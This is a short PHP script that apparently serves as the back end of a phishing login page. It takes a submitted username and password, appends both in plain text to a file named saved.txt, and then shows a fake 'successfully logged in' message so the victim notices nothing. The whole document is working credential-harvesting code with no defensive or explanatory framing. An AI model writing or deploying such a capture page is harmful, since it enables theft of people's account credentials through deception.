<?php
if(isset($_POST['submit'])){
$Name = "Username:".$_POST['username']."
";
$Pass = "Password:".$_POST['password']."
";
$file=fopen("saved.txt", "a");
fwrite($file, $Name);
fwrite($file, $Pass);
fclose($file);
}
?>

<html>
<body>
	<h1>You have successfull logged in ;-) !!!</h1>
</body>

</html>


